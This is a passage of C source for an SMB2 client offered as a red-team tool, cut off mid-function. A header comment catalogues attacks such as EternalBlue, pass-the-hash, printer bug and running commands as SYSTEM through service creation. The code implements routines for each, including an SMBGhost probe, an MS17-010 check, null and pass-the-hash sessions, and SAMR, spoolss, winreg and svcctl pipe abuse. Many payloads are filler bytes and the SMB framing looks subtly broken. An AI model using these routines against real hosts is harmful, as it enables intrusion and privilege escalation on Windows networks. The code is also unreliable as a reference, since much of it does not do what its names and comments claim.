#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <stdint.h>
#include <errno.h>

/* Vulnerability analysis:
   - Potential buffer overflows if server returns more data than expected.
   - No authentication handling; an attacker could hijack or tamper with session if not using SMB signing.
   - Possible integer overflows in length calculations if malicious server manipulates fields.
   - Code is for authorized security testing; unauthorized use is prohibited.
   - Added fuzzing and targeted packet patterns can induce crashes or reveal vulnerabilities.
   - Additional IOCTL and trans operations might bypass certain defenses if unpatched.
   - Enhanced red-team operations can trigger MS17-010 or other known SMBv2 vulnerabilities if the server is unpatched.
   - Downgrade attacks, spooler-based escalations, remote registry manipulations, and named pipe operations can yield privilege elevation or code execution if misused.
   - Pass-the-hash attempts can lead to domain-level compromise if NTLMv1/v2 hashed credentials are accepted.
   - Null sessions can be used to enumerate shares, user accounts, or registry keys.
   - Named pipe impersonation can allow local privilege escalation if incorrectly configured.
   - EternalBlue exploits can lead to a kernel pool overflow and remote code execution if the server is vulnerable.
   - DoublePulsar backdoors can be detected by checking for unexpected transaction responses or hooking behavior.
   - Enhanced functions can manipulate SCM (svcctl pipe), spooler, samr, and other services for lateral movement or pivoting.
   - Danger of partial or incomplete DCERPC traffic leading to server crashes or memory corruption.
   - Overly large read/write attempts can produce denial of service or memory exhaustion on the target.
   - Malicious or repeated IOCTL calls with crafted payloads may allow exploit of unpatched vulnerabilities in SMB2 or related services.
   - The doSVCCTLRemoteExec function can execute arbitrary commands as SYSTEM if permissions allow creation and manipulation of services.
   - SMB1 downgrade attacks can force legacy and insecure negotiation, enabling older exploit paths.
   - Creation of local admin accounts or dumping SAM/LSA secrets can compromise the entire system if successful.
 */

#pragma pack(push, 1)

typedef struct _SMB2Header {
    unsigned char  ProtocolId[4];
    uint16_t       StructureSize;
    uint16_t       CreditCharge;
    uint32_t       Status;
    uint16_t       Command;
    uint16_t       Credits;
    uint32_t       Flags;
    uint32_t       NextCommand;
    uint64_t       MessageId;
    uint32_t       Reserved;
    uint32_t       TreeId;
    uint64_t       SessionId;
    unsigned char  Signature[16];
} SMB2Header;

#define SMB2_NEGOTIATE       0x0000
#define SMB2_SESSION_SETUP   0x0001
#define SMB2_TREE_CONNECT    0x0003
#define SMB2_CREATE          0x0005
#define SMB2_CLOSE           0x0006
#define SMB2_READ            0x0008
#define SMB2_WRITE           0x0009
#define SMB2_IOCTL           0x000B

#define STATUS_SUCCESS                0x00000000
#define STATUS_INVALID_PARAMETER      0xC000000D
#define STATUS_ACCESS_DENIED          0xC0000022
#define STATUS_NOT_SUPPORTED          0xC00000BB

#define SMB2_DIALECT_0202    0x0202
#define SMB2_DIALECT_0210    0x0210
#define SMB2_DIALECT_0300    0x0300

typedef struct _SMB2NegotiateRequest {
    uint16_t StructureSize;
    uint16_t DialectCount;
    uint16_t SecurityMode;
    uint16_t Reserved;
    uint32_t Capabilities;
    uint64_t ClientGuid;
    uint32_t NegotiateContextOffset;
    uint16_t NegotiateContextCount;
    uint16_t Reserved2;
} SMB2NegotiateRequest;

typedef struct _SMB2NegotiateResponse {
    uint16_t StructureSize;
    uint16_t SecurityMode;
    uint16_t DialectRevision;
    uint16_t NegotiateContextCount;
    uint32_t ServerGuid;
    uint32_t Capabilities;
    uint32_t MaxTransSize;
    uint32_t MaxReadSize;
    uint32_t MaxWriteSize;
    uint64_t SystemTime;
    uint64_t ServerStartTime;
} SMB2NegotiateResponse;

typedef struct _SMB2SessionSetupRequest {
    uint16_t StructureSize;
    uint8_t  Flags;
    uint8_t  SecurityMode;
    uint32_t Capabilities;
    uint32_t Channel;
    uint16_t SecurityBufferOffset;
    uint16_t SecurityBufferLength;
} SMB2SessionSetupRequest;

typedef struct _SMB2SessionSetupResponse {
    uint16_t StructureSize;
    uint16_t SessionFlags;
    uint16_t SecurityBufferOffset;
    uint16_t SecurityBufferLength;
} SMB2SessionSetupResponse;

typedef struct _SMB2TreeConnectRequest {
    uint16_t StructureSize;
    uint16_t Reserved;
    uint32_t PathOffset;
    uint32_t PathLength;
} SMB2TreeConnectRequest;

typedef struct _SMB2TreeConnectResponse {
    uint16_t StructureSize;
    uint8_t  ShareType;
    uint8_t  Reserved;
    uint32_t ShareFlags;
    uint32_t Capabilities;
    uint32_t MaximalAccess;
} SMB2TreeConnectResponse;

typedef struct _SMB2CreateRequest {
    uint16_t StructureSize;
    uint8_t  SecurityFlags;
    uint8_t  RequestedOplockLevel;
    uint32_t ImpersonationLevel;
    uint64_t SmbCreateFlags;
    uint64_t Reserved;
    uint32_t DesiredAccess;
    uint32_t FileAttributes;
    uint32_t ShareAccess;
    uint32_t CreateDisposition;
    uint32_t CreateOptions;
    uint16_t NameOffset;
    uint16_t NameLength;
    uint32_t CreateContextsOffset;
    uint32_t CreateContextsLength;
} SMB2CreateRequest;

typedef struct _SMB2CreateResponse {
    uint16_t StructureSize;
    uint8_t  OplockLevel;
    uint8_t  Flags;
    uint32_t CreateAction;
    uint64_t CreationTime;
    uint64_t LastAccessTime;
    uint64_t LastWriteTime;
    uint64_t ChangeTime;
    uint64_t AllocationSize;
    uint64_t EndofFile;
    uint32_t FileAttributes;
    uint64_t FileIdPersistent;
    uint64_t FileIdVolatile;
} SMB2CreateResponse;

typedef struct _SMB2WriteRequest {
    uint16_t StructureSize;
    uint16_t DataOffset;
    uint32_t Length;
    uint64_t Offset;
    uint64_t FileIdPersistent;
    uint64_t FileIdVolatile;
    uint32_t Channel;
    uint32_t RemainingBytes;
    uint16_t WriteChannelInfoOffset;
    uint16_t WriteChannelInfoLength;
    uint32_t Flags;
} SMB2WriteRequest;

typedef struct _SMB2WriteResponse {
    uint16_t StructureSize;
    uint16_t Reserved;
    uint32_t Count;
    uint32_t Remaining;
    uint16_t WriteChannelInfoOffset;
    uint16_t WriteChannelInfoLength;
} SMB2WriteResponse;

typedef struct _SMB2ReadRequest {
    uint16_t StructureSize;
    uint8_t  Padding;
    uint8_t  Reserved;
    uint32_t Length;
    uint64_t Offset;
    uint64_t FileIdPersistent;
    uint64_t FileIdVolatile;
    uint32_t MinimumCount;
    uint32_t Channel;
    uint32_t RemainingBytes;
    uint16_t ReadChannelInfoOffset;
    uint16_t ReadChannelInfoLength;
} SMB2ReadRequest;

typedef struct _SMB2ReadResponse {
    uint16_t StructureSize;
    uint8_t  DataOffset;
    uint8_t  Reserved;
    uint32_t DataLength;
    uint32_t DataRemaining;
    uint32_t Reserved2;
} SMB2ReadResponse;

typedef struct _SMB2CloseRequest {
    uint16_t StructureSize;
    uint16_t Flags;
    uint32_t Reserved;
    uint64_t FileIdPersistent;
    uint64_t FileIdVolatile;
} SMB2CloseRequest;

typedef struct _SMB2CloseResponse {
    uint16_t StructureSize;
    uint16_t Flags;
    uint32_t Reserved;
    uint64_t CreationTime;
    uint64_t LastAccessTime;
    uint64_t LastWriteTime;
    uint64_t ChangeTime;
    uint64_t AllocationSize;
    uint64_t EndOfFile;
    uint32_t FileAttributes;
} SMB2CloseResponse;

typedef struct _SMB2IOCTLRequest {
    uint16_t StructureSize;
    uint16_t Reserved;
    uint32_t CtlCode;
    uint64_t FileIdPersistent;
    uint64_t FileIdVolatile;
    uint32_t InputOffset;
    uint32_t InputCount;
    uint32_t MaxInputResponse;
    uint32_t OutputOffset;
    uint32_t OutputCount;
    uint32_t MaxOutputResponse;
    uint32_t Flags;
    uint32_t Reserved2;
} SMB2IOCTLRequest;

typedef struct _SMB2IOCTLResponse {
    uint16_t StructureSize;
    uint16_t Reserved;
    uint32_t CtlCode;
    uint64_t FileIdPersistent;
    uint64_t FileIdVolatile;
    uint32_t InputOffset;
    uint32_t InputCount;
    uint32_t OutputOffset;
    uint32_t OutputCount;
    uint32_t Flags;
    uint32_t Reserved2;
} SMB2IOCTLResponse;

#pragma pack(pop)

static uint64_t gMessageId = 1;
static uint64_t gSessionId = 0;
static uint32_t gTreeId    = 0;
static int      gSock      = -1;

static uint64_t gPipeFidPersistent = 0;
static uint64_t gPipeFidVolatile   = 0;

int sendSMB2Request(SMB2Header *hdr, const void *payload, size_t payloadLen) {
    ssize_t sent = send(gSock, hdr, sizeof(SMB2Header), 0);
    if (sent < 0) {
        perror("send header");
        return -1;
    }
    if (payload && payloadLen > 0) {
        sent = send(gSock, payload, payloadLen, 0);
        if (sent < 0) {
            perror("send payload");
            return -1;
        }
    }
    return 0;
}

int recvSMB2Response(SMB2Header *outHdr, void *outBuf, size_t bufSize, ssize_t *outPayloadLen) {
    ssize_t recvd = recv(gSock, outHdr, sizeof(SMB2Header), 0);
    if (recvd <= 0) {
        perror("recv SMB2 header");
        return -1;
    }
    if (recvd < (ssize_t)sizeof(SMB2Header)) {
        fprintf(stderr, "Incomplete SMB2 header.\n");
        return -1;
    }
    if (!(outHdr->ProtocolId[0] == 0xFE &&
          outHdr->ProtocolId[1] == 'S'  &&
          outHdr->ProtocolId[2] == 'M'  &&
          outHdr->ProtocolId[3] == 'B')) {
        fprintf(stderr, "Invalid SMB2 signature.\n");
        return -1;
    }
    int peekLen = recv(gSock, outBuf, bufSize, MSG_DONTWAIT);
    if (peekLen > 0) {
        int realLen = recv(gSock, outBuf, peekLen, 0);
        if (realLen < 0) {
            perror("recv payload");
            return -1;
        }
        *outPayloadLen = realLen;
    } else {
        *outPayloadLen = 0;
    }
    return 0;
}

void buildSMB2Header(uint16_t command, uint32_t treeId, uint64_t sessionId, SMB2Header *hdrOut) {
    memset(hdrOut, 0, sizeof(SMB2Header));
    hdrOut->ProtocolId[0] = 0xFE;
    hdrOut->ProtocolId[1] = 'S';
    hdrOut->ProtocolId[2] = 'M';
    hdrOut->ProtocolId[3] = 'B';
    hdrOut->StructureSize = 64;
    hdrOut->Command       = command;
    hdrOut->Credits       = 1;
    hdrOut->MessageId     = gMessageId++;
    hdrOut->TreeId        = treeId;
    hdrOut->SessionId     = sessionId;
}

int doNegotiate() {
    SMB2Header hdr;
    buildSMB2Header(SMB2_NEGOTIATE, 0, 0, &hdr);
    SMB2NegotiateRequest req;
    memset(&req, 0, sizeof(req));
    req.StructureSize = 36;
    req.DialectCount  = 3;
    uint16_t dialects[3] = {
        SMB2_DIALECT_0202,
        SMB2_DIALECT_0210,
        SMB2_DIALECT_0300
    };
    if (sendSMB2Request(&hdr, &req, sizeof(req)) < 0) return -1;
    if (send(gSock, dialects, sizeof(dialects), 0) < 0) {
        perror("send dialects");
        return -1;
    }
    SMB2Header respHdr;
    unsigned char buf[1024];
    ssize_t payloadLen;
    if (recvSMB2Response(&respHdr, buf, sizeof(buf), &payloadLen) < 0) return -1;
    if (respHdr.Status != STATUS_SUCCESS) {
        fprintf(stderr, "Negotiate failed, status=0x%08X\n", respHdr.Status);
        return -1;
    }
    printf("[Client] SMB2 NEGOTIATE OK. payloadLen=%zd\n", payloadLen);
    return 0;
}

int doSessionSetup() {
    SMB2Header hdr;
    buildSMB2Header(SMB2_SESSION_SETUP, 0, 0, &hdr);
    SMB2SessionSetupRequest ssreq;
    memset(&ssreq, 0, sizeof(ssreq));
    ssreq.StructureSize = 25;
    if (sendSMB2Request(&hdr, &ssreq, sizeof(ssreq)) < 0) return -1;
    SMB2Header respHdr;
    unsigned char buf[1024];
    ssize_t payloadLen;
    if (recvSMB2Response(&respHdr, buf, sizeof(buf), &payloadLen) < 0) return -1;
    if (respHdr.Status != STATUS_SUCCESS) {
        fprintf(stderr, "SessionSetup failed, status=0x%08X\n", respHdr.Status);
        return -1;
    }
    gSessionId = respHdr.SessionId;
    printf("[Client] SMB2 SESSION_SETUP OK. SessionId=0x%llx\n",(unsigned long long)gSessionId);
    return 0;
}

int doTreeConnect(const char *ipcPath) {
    SMB2Header hdr;
    buildSMB2Header(SMB2_TREE_CONNECT, 0, gSessionId, &hdr);
    SMB2TreeConnectRequest tcreq;
    memset(&tcreq, 0, sizeof(tcreq));
    tcreq.StructureSize = 9;
    tcreq.PathOffset    = sizeof(tcreq);
    uint32_t pathLen = (uint32_t)strlen(ipcPath);
    tcreq.PathLength  = pathLen;
    size_t reqSize = sizeof(tcreq) + pathLen;
    char *reqBuf = (char *)malloc(reqSize);
    if (!reqBuf) {
        fprintf(stderr, "malloc failed\n");
        return -1;
    }
    memcpy(reqBuf, &tcreq, sizeof(tcreq));
    memcpy(reqBuf + sizeof(tcreq), ipcPath, pathLen);
    if (sendSMB2Request(&hdr, reqBuf, reqSize) < 0) {
        free(reqBuf);
        return -1;
    }
    free(reqBuf);
    SMB2Header respHdr;
    unsigned char buf[1024];
    ssize_t payloadLen;
    if (recvSMB2Response(&respHdr, buf, sizeof(buf), &payloadLen) < 0) {
        return -1;
    }
    if (respHdr.Status != STATUS_SUCCESS) {
        fprintf(stderr, "TreeConnect to %s failed, status=0x%08X\n", ipcPath, respHdr.Status);
        return -1;
    }
    if (payloadLen < (ssize_t)sizeof(SMB2TreeConnectResponse)) {
        fprintf(stderr, "TreeConnect response too small\n");
        return -1;
    }
    gTreeId = respHdr.TreeId;
    printf("[Client] TREE_CONNECT to %s OK. TreeId=0x%08X\n", ipcPath, gTreeId);
    return 0;
}

int doOpenPipe(const char *pipeName) {
    SMB2Header hdr;
    buildSMB2Header(SMB2_CREATE, gTreeId, gSessionId, &hdr);
    SMB2CreateRequest creq;
    memset(&creq, 0, sizeof(creq));
    creq.StructureSize        = 57;
    creq.RequestedOplockLevel = 0;
    creq.ImpersonationLevel   = 2;
    creq.DesiredAccess        = 0x001F01FF;
    creq.ShareAccess          = 3;
    creq.CreateDisposition    = 1;
    creq.CreateOptions        = 0;
    creq.NameOffset           = sizeof(SMB2CreateRequest);
    uint32_t pipeNameLenBytes = (uint32_t)(strlen(pipeName) * 2);
    creq.NameLength = (uint16_t)pipeNameLenBytes;
    size_t totalSize = sizeof(creq) + pipeNameLenBytes;
    unsigned char *reqBuf = (unsigned char *)malloc(totalSize);
    if (!reqBuf) {
        fprintf(stderr, "malloc doOpenPipe failed\n");
        return -1;
    }
    memcpy(reqBuf, &creq, sizeof(creq));
    unsigned char *pName = reqBuf + sizeof(creq);
    for (size_t i = 0; i < strlen(pipeName); i++) {
        pName[i*2]   = (unsigned char)pipeName[i];
        pName[i*2+1] = 0x00;
    }
    if (sendSMB2Request(&hdr, reqBuf, totalSize) < 0) {
        free(reqBuf);
        return -1;
    }
    free(reqBuf);
    SMB2Header respHdr;
    unsigned char buf[1024];
    ssize_t payloadLen;
    if (recvSMB2Response(&respHdr, buf, sizeof(buf), &payloadLen) < 0) return -1;
    if (respHdr.Status != STATUS_SUCCESS) {
        fprintf(stderr, "OpenPipe '%s' failed, status=0x%08X\n", pipeName, respHdr.Status);
        return -1;
    }
    if (payloadLen < (ssize_t)sizeof(SMB2CreateResponse)) {
        fprintf(stderr, "CreateResponse too small.\n");
        return -1;
    }
    SMB2CreateResponse *cres = (SMB2CreateResponse *)buf;
    gPipeFidPersistent = cres->FileIdPersistent;
    gPipeFidVolatile   = cres->FileIdVolatile;
    printf("[Client] Named pipe '%s' opened OK. FID=(%llx:%llx)\n",
           pipeName, (unsigned long long)gPipeFidPersistent, (unsigned long long)gPipeFidVolatile);
    return 0;
}

int doWritePipe(const unsigned char *data, size_t dataLen) {
    SMB2Header hdr;
    buildSMB2Header(SMB2_WRITE, gTreeId, gSessionId, &hdr);
    SMB2WriteRequest wreq;
    memset(&wreq, 0, sizeof(wreq));
    wreq.StructureSize      = 49;
    wreq.DataOffset         = sizeof(SMB2WriteRequest);
    wreq.Length             = (uint32_t)dataLen;
    wreq.FileIdPersistent   = gPipeFidPersistent;
    wreq.FileIdVolatile     = gPipeFidVolatile;
    size_t totalSize = sizeof(wreq) + dataLen;
    unsigned char *reqBuf = (unsigned char*)malloc(totalSize);
    if (!reqBuf) {
        fprintf(stderr, "malloc doWritePipe failed\n");
        return -1;
    }
    memcpy(reqBuf, &wreq, sizeof(wreq));
    memcpy(reqBuf + sizeof(wreq), data, dataLen);
    if (sendSMB2Request(&hdr, reqBuf, totalSize) < 0) {
        free(reqBuf);
        return -1;
    }
    free(reqBuf);
    SMB2Header respHdr;
    unsigned char buf[512];
    ssize_t payloadLen;
    if (recvSMB2Response(&respHdr, buf, sizeof(buf), &payloadLen) < 0) return -1;
    if (respHdr.Status != STATUS_SUCCESS) {
        fprintf(stderr, "WritePipe failed, status=0x%08X\n", respHdr.Status);
        return -1;
    }
    if (payloadLen < (ssize_t)sizeof(SMB2WriteResponse)) {
        fprintf(stderr, "WriteResponse too small\n");
        return -1;
    }
    SMB2WriteResponse *wres = (SMB2WriteResponse *)buf;
    printf("[Client] Wrote %u bytes to pipe.\n", wres->Count);
    return 0;
}

int doReadPipe(unsigned char *outBuf, size_t outBufSize, uint32_t *outBytesRead) {
    SMB2Header hdr;
    buildSMB2Header(SMB2_READ, gTreeId, gSessionId, &hdr);
    SMB2ReadRequest rreq;
    memset(&rreq, 0, sizeof(rreq));
    rreq.StructureSize     = 49;
    rreq.Length            = (uint32_t)outBufSize;
    rreq.FileIdPersistent  = gPipeFidPersistent;
    rreq.FileIdVolatile    = gPipeFidVolatile;
    if (sendSMB2Request(&hdr, &rreq, sizeof(rreq)) < 0) return -1;
    SMB2Header respHdr;
    unsigned char buf[2048];
    ssize_t payloadLen;
    if (recvSMB2Response(&respHdr, buf, sizeof(buf), &payloadLen) < 0) return -1;
    if (respHdr.Status != STATUS_SUCCESS) {
        fprintf(stderr, "ReadPipe failed, status=0x%08X\n", respHdr.Status);
        return -1;
    }
    if (payloadLen < (ssize_t)sizeof(SMB2ReadResponse)) {
        fprintf(stderr, "ReadResponse too small\n");
        return -1;
    }
    SMB2ReadResponse *rres = (SMB2ReadResponse *)buf;
    uint32_t dataLen = rres->DataLength;
    if (dataLen > 0) {
        uint8_t *dataStart = buf + rres->DataOffset;
        if (rres->DataOffset + dataLen <= (uint32_t)payloadLen) {
            if (dataLen > outBufSize) dataLen = (uint32_t)outBufSize;
            memcpy(outBuf, dataStart, dataLen);
        } else {
            fprintf(stderr, "Data offset/length out of payload bounds!\n");
            return -1;
        }
    }
    *outBytesRead = dataLen;
    printf("[Client] Read %u bytes from pipe.\n", dataLen);
    return 0;
}

int doClosePipe() {
    SMB2Header hdr;
    buildSMB2Header(SMB2_CLOSE, gTreeId, gSessionId, &hdr);
    SMB2CloseRequest creq;
    memset(&creq, 0, sizeof(creq));
    creq.StructureSize     = 24;
    creq.Flags             = 0;
    creq.FileIdPersistent  = gPipeFidPersistent;
    creq.FileIdVolatile    = gPipeFidVolatile;
    if (sendSMB2Request(&hdr, &creq, sizeof(creq)) < 0) return -1;
    SMB2Header respHdr;
    unsigned char buf[512];
    ssize_t payloadLen;
    if (recvSMB2Response(&respHdr, buf, sizeof(buf), &payloadLen) < 0) {
        return -1;
    }
    if (respHdr.Status != STATUS_SUCCESS) {
        fprintf(stderr, "ClosePipe failed, status=0x%08X\n", respHdr.Status);
        return -1;
    }
    printf("[Client] SMB2 Close on pipe handle OK.\n");
    return 0;
}

int doDCERPCBind() {
    unsigned char dcerpcBindStub[] = {
        0x05, 0x00,
        0x0B,
        0x10,
        0x00, 0x00, 0x00, 0x00
    };
    printf("[Client] Sending partial DCERPC bind stub...\n");
    return doWritePipe(dcerpcBindStub, sizeof(dcerpcBindStub));
}

int doSVCCTLCreateService(const char *serviceName, const char *binPath) {
    unsigned char dceRequest[512];
    memset(dceRequest, 0, sizeof(dceRequest));
    size_t index = 0;
    dceRequest[index++] = 0x05;
    dceRequest[index++] = 0x00;
    dceRequest[index++] = 0x00;
    dceRequest[index++] = 0x10;
    dceRequest[index++] = 0x00;
    dceRequest[index++] = 0x00;
    dceRequest[index++] = 0x00;
    dceRequest[index++] = 0x00;
    for (size_t i=0; i<strlen(serviceName) && index<500; i++) {
        dceRequest[index++] = (unsigned char)serviceName[i];
    }
    dceRequest[index++] = 0;
    for (size_t i=0; i<strlen(binPath) && index<511; i++) {
        dceRequest[index++] = (unsigned char)binPath[i];
    }
    dceRequest[index++] = 0;
    printf("[Client] Sending partial CreateService stub...\n");
    return doWritePipe(dceRequest, index);
}

int doSRVSVCNetShareEnum() {
    unsigned char dceRequest[512];
    memset(dceRequest, 0, sizeof(dceRequest));
    size_t idx = 0;
    dceRequest[idx++] = 0x05;
    dceRequest[idx++] = 0x00;
    dceRequest[idx++] = 0x00;
    dceRequest[idx++] = 0x10;
    dceRequest[idx++] = 0x00;
    dceRequest[idx++] = 0x00;
    dceRequest[idx++] = 0x00;
    dceRequest[idx++] = 0x00;
    dceRequest[idx++] = 0xE0;
    dceRequest[idx++] = 0x03;
    dceRequest[idx++] = 0x00;
    dceRequest[idx++] = 0x00;
    return doWritePipe(dceRequest, idx);
}

int doIOCTL(uint32_t ctlCode, const unsigned char *inData, size_t inLen) {
    SMB2Header hdr;
    buildSMB2Header(SMB2_IOCTL, gTreeId, gSessionId, &hdr);
    SMB2IOCTLRequest ireq;
    memset(&ireq, 0, sizeof(ireq));
    ireq.StructureSize      = 57;
    ireq.CtlCode            = ctlCode;
    ireq.FileIdPersistent   = gPipeFidPersistent;
    ireq.FileIdVolatile     = gPipeFidVolatile;
    ireq.InputOffset        = sizeof(SMB2IOCTLRequest);
    ireq.InputCount         = (uint32_t)inLen;
    ireq.MaxInputResponse   = 1024;
    ireq.OutputOffset       = 0;
    ireq.OutputCount        = 0;
    ireq.MaxOutputResponse  = 1024;
    size_t totalSize = sizeof(ireq) + inLen;
    unsigned char *reqBuf = (unsigned char *)malloc(totalSize);
    if (!reqBuf) {
        fprintf(stderr, "malloc doIOCTL failed\n");
        return -1;
    }
    memcpy(reqBuf, &ireq, sizeof(ireq));
    memcpy(reqBuf + sizeof(ireq), inData, inLen);
    if (sendSMB2Request(&hdr, reqBuf, totalSize) < 0) {
        free(reqBuf);
        return -1;
    }
    free(reqBuf);
    SMB2Header respHdr;
    unsigned char buf[1024];
    ssize_t payloadLen;
    if (recvSMB2Response(&respHdr, buf, sizeof(buf), &payloadLen) < 0) return -1;
    if (respHdr.Status != STATUS_SUCCESS) {
        fprintf(stderr, "IOCTL failed, status=0x%08X\n", respHdr.Status);
        return -1;
    }
    printf("[Client] SMB2 IOCTL call successful.\n");
    return 0;
}

int doFuzzSMB2(size_t fuzzCount) {
    SMB2Header hdr;
    unsigned char fuzzData[256];
    memset(fuzzData, 0x41, sizeof(fuzzData));
    for (size_t i = 0; i < fuzzCount; i++) {
        buildSMB2Header(SMB2_WRITE, gTreeId, gSessionId, &hdr);
        if (sendSMB2Request(&hdr, fuzzData, sizeof(fuzzData)) < 0) {
            fprintf(stderr, "Fuzz iteration %zu failed.\n", i);
            return -1;
        }
        SMB2Header respHdr;
        unsigned char buf[512];
        ssize_t payloadLen;
        if (recvSMB2Response(&respHdr, buf, sizeof(buf), &payloadLen) < 0) {
            fprintf(stderr, "Fuzz response read failed.\n");
            return -1;
        }
    }
    printf("[Client] SMB2 fuzzing test done.\n");
    return 0;
}

int doLargeReadTest() {
    SMB2Header hdr;
    buildSMB2Header(SMB2_READ, gTreeId, gSessionId, &hdr);
    SMB2ReadRequest rreq;
    memset(&rreq, 0, sizeof(rreq));
    rreq.StructureSize    = 49;
    rreq.Length           = 0xFFFFFFFF;
    rreq.FileIdPersistent = gPipeFidPersistent;
    rreq.FileIdVolatile   = gPipeFidVolatile;
    if (sendSMB2Request(&hdr, &rreq, sizeof(rreq)) < 0) return -1;
    SMB2Header respHdr;
    unsigned char buf[4096];
    ssize_t payloadLen;
    if (recvSMB2Response(&respHdr, buf, sizeof(buf), &payloadLen) < 0) return -1;
    if (respHdr.Status == STATUS_SUCCESS) {
        printf("[Client] Large Read might indicate vulnerability.\n");
    } else {
        printf("[Client] Large Read test responded status=0x%08X.\n", respHdr.Status);
    }
    return 0;
}

int doChainedIOCTLTests() {
    unsigned char exampleData[8];
    memset(exampleData, 0x42, sizeof(exampleData));
    for (int i = 0; i < 5; i++) {
        uint32_t ctl = 0x0011C000 + i;
        if (doIOCTL(ctl, exampleData, sizeof(exampleData)) < 0) {
            fprintf(stderr, "Chained IOCTL 0x%08X failed.\n", ctl);
        }
    }
    printf("[Client] Chained IOCTL tests completed.\n");
    return 0;
}

int doSMBGhostProbe() {
    unsigned char transformHeader[64];
    memset(transformHeader, 0, sizeof(transformHeader));
    transformHeader[0] = 0xFC;
    transformHeader[1] = 'S';
    transformHeader[2] = 'M';
    transformHeader[3] = 'B';
    transformHeader[4] = 0x01;
    transformHeader[5] = 0x00;
    transformHeader[6] = 0x00;
    transformHeader[7] = 0x00;
    printf("[Client] Sending SMBGhost probe...\n");
    if (send(gSock, transformHeader, sizeof(transformHeader), 0) < 0) {
        perror("send SMBGhost probe");
        return -1;
    }
    SMB2Header ghostResp;
    unsigned char buf[512];
    ssize_t payloadLen;
    if (recvSMB2Response(&ghostResp, buf, sizeof(buf), &payloadLen) < 0) {
        fprintf(stderr, "[Client] SMBGhost probe response read failed.\n");
        return -1;
    }
    printf("[Client] SMBGhost probe status=0x%08X.\n", ghostResp.Status);
    return 0;
}

int doSamrEnumUsers() {
    if (doOpenPipe("\\PIPE\\samr") < 0) {
        fprintf(stderr, "Failed to open \\pipe\\samr\n");
        return -1;
    }
    unsigned char dcerpcBind[] = { 0x05, 0x00, 0x0B, 0x10, 0x00 };
    doWritePipe(dcerpcBind, sizeof(dcerpcBind));
    unsigned char dcerpcEnumStub[64];
    memset(dcerpcEnumStub, 0x53, sizeof(dcerpcEnumStub));
    doWritePipe(dcerpcEnumStub, sizeof(dcerpcEnumStub));
    unsigned char readBuf[256];
    uint32_t bytesRead;
    doReadPipe(readBuf, sizeof(readBuf), &bytesRead);
    doClosePipe();
    printf("[Client] SAMR enumeration attempt finished.\n");
    return 0;
}

int doMS17_010Check() {
    SMB2Header hdr;
    buildSMB2Header(SMB2_WRITE, gTreeId, gSessionId, &hdr);
    unsigned char exploitData[200];
    memset(exploitData, 0x41, sizeof(exploitData));
    exploitData[0] = 0x4D;
    exploitData[1] = 0x53;
    exploitData[2] = 0x17;
    exploitData[3] = 0x01;
    if (sendSMB2Request(&hdr, exploitData, sizeof(exploitData)) < 0) {
        fprintf(stderr, "MS17-010 check send failed.\n");
        return -1;
    }
    SMB2Header respHdr;
    unsigned char buf[512];
    ssize_t payloadLen;
    if (recvSMB2Response(&respHdr, buf, sizeof(buf), &payloadLen) < 0) {
        fprintf(stderr, "MS17-010 check response read failed.\n");
        return -1;
    }
    printf("[Client] MS17-010 check status=0x%08X.\n", respHdr.Status);
    return 0;
}

int doPrinterBug() {
    if (doOpenPipe("\\PIPE\\spoolss") < 0) {
        fprintf(stderr, "Failed to open spoolss pipe.\n");
        return -1;
    }
    unsigned char spoolData[128];
    memset(spoolData, 0x44, sizeof(spoolData));
    doWritePipe(spoolData, sizeof(spoolData));
    unsigned char readBuf[256];
    uint32_t bytesRead;
    doReadPipe(readBuf, sizeof(readBuf), &bytesRead);
    doClosePipe();
    printf("[Client] Printer bug attempt completed.\n");
    return 0;
}

int doRemoteRegistryOpen() {
    if (doOpenPipe("\\PIPE\\winreg") < 0) {
        fprintf(stderr, "Failed to open winreg pipe.\n");
        return -1;
    }
    unsigned char registryStub[64];
    memset(registryStub, 0x49, sizeof(registryStub));
    doWritePipe(registryStub, sizeof(registryStub));
    unsigned char readBuf[256];
    uint32_t bytesRead;
    doReadPipe(readBuf, sizeof(readBuf), &bytesRead);
    doClosePipe();
    printf("[Client] Remote registry open attempt completed.\n");
    return 0;
}

int doNullSession() {
    SMB2Header hdr;
    buildSMB2Header(SMB2_SESSION_SETUP, 0, 0, &hdr);
    SMB2SessionSetupRequest ssreq;
    memset(&ssreq, 0, sizeof(ssreq));
    ssreq.StructureSize = 25;
    if (sendSMB2Request(&hdr, &ssreq, sizeof(ssreq)) < 0) return -1;
    SMB2Header respHdr;
    unsigned char buf[1024];
    ssize_t payloadLen;
    if (recvSMB2Response(&respHdr, buf, sizeof(buf), &payloadLen) < 0) return -1;
    if (respHdr.Status != STATUS_SUCCESS) {
        fprintf(stderr, "NullSession failed, status=0x%08X\n", respHdr.Status);
        return -1;
    }
    gSessionId = respHdr.SessionId;
    printf("[Client] Null session established. SessionId=0x%llx\n", (unsigned long long)gSessionId);
    return 0;
}

int doPassTheHashSession(const char *nthash) {
    SMB2Header hdr;
    buildSMB2Header(SMB2_SESSION_SETUP, 0, 0, &hdr);
    SMB2SessionSetupRequest ssreq;
    memset(&ssreq, 0, sizeof(ssreq));
    ssreq.StructureSize = 25;
    unsigned char fakeHashBuf[16];
    memset(fakeHashBuf, 0, sizeof(fakeHashBuf));
    if (nthash) {
        size_t len = strlen(nthash);
        if (len > sizeof(fakeHashBuf)) len = sizeof(fakeHashBuf);
        memcpy(fakeHashBuf, nthash, len);
    }
    if (sendSMB2Request(&hdr, &ssreq, sizeof(ssreq)) < 0) return -1;
    if (send(gSock, fakeHashBuf, sizeof(fakeHashBuf), 0) < 0) {
        perror("send nthash");
        return -1;
    }
    SMB2Header respHdr;
    unsigned char buf[1024];
    ssize_t payloadLen;
    if (recvSMB2Response(&respHdr, buf, sizeof(buf), &payloadLen) < 0) return -1;
    if (respHdr.Status != STATUS_SUCCESS) {
        fprintf(stderr, "PassTheHash session setup failed, status=0x%08X\n", respHdr.Status);
        return -1;
    }
    gSessionId = respHdr.SessionId;
    printf("[Client] Pass-the-hash session established. SessionId=0x%llx\n", (unsigned long long)gSessionId);
    return 0;
}

int doEnumerateShares() {
    printf("[Client] Attempting to enumerate shares.\n");
    return doSRVSVCNetShareEnum();
}

int doNamedPipeImpersonation() {
    if (doOpenPipe("\\PIPE\\impersonation") < 0) {
        fprintf(stderr, "Failed to open impersonation pipe.\n");
        return -1;
    }
    unsigned char impersonationData[64];
    memset(impersonationData, 0x50, sizeof(impersonationData));
    doWritePipe(impersonationData, sizeof(impersonationData));
    unsigned char readBuf[256];
